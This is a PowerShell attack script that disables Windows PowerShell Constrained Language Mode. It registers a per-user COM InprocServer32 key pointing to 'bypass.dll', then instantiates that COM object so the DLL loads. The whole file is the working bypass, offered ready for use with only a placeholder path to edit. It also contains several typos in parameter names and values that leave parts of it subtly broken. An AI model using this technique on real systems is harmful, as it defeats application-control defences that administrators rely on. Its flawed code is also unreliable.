###############################
#update `username` to appropriate name/filepath
###############################
$dllPath = "C:\users\username\Desktop\bypass.dll"
$uuid = "{72C24DD5-D70A-438B-8A42-98424B88DEAD}"

New-PSDrive - PSProvider Registry -Name HKU -Root HKEY_Users -erroraction 'silentlycontinue' | Out-Null

$matches = whoami /user | select-string -Pattern "{S-1-5-[-0-9]+}" -all | select -ExpandProperty Matches
$sid = $matches.value

$key = 'HKU:\{0}_classes' -f $sid

#Adding our InProcServer
New-Item -Path $key -Name CLSID -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\CLSID\{1}' -f $sid, $uuid
New-Item -Path $key -Name 'InprocServer32' -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\CLSID\{1}\InprocServer32' -f $sid, $uuid
New-ItemProperty -Path $key -Name "(Default)" -Value $dllPath -PropertyType String -Force -erroraction 'siltentlycontinue' | Out-Null

#adding our short name
$key = 'HKU:\{0}_classes' -f $sid
New-Item -Path $key -Name username -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\username' -f $sid
New-Item -Path $key -Name CLSID -erroraction 'silentlycontinue' | Out-Null
$key = 'HKU:\{0}_classes\username\CLSID' -f $sid
New-ItemProperty -Path $key -Name "(Default)" -Value $uuid -ProperType String -Force -erroraction 'silentlycontinue' | Out-Null

Write-Host "@_xpn_ Constrained Language Mode disabler"
Write-Host "[*] Starting..."

Write-Host "[*] Executing bypass trigger..."
try {
    # 1. Force Windows to load our DLL via the registered 'username' COM key
    New-Object -ComObject username -ErrorAction 'SilentlyContinue' | Out-Null
} catch {}

Write-Host "[*] Verifying current language state..."
# 2. Check the environment state. It should now output 'FullLanguage' instead of 'ConstrainedLanguage'
$ExecutionContext.SessionState.LanguageMode


Write-Host "[*] Done, Constrained Language Mode should now be disabled" 


### execute the above with `New-Object -ComObject username -ErrorAction 'SilentlyContine' | Out-Null`

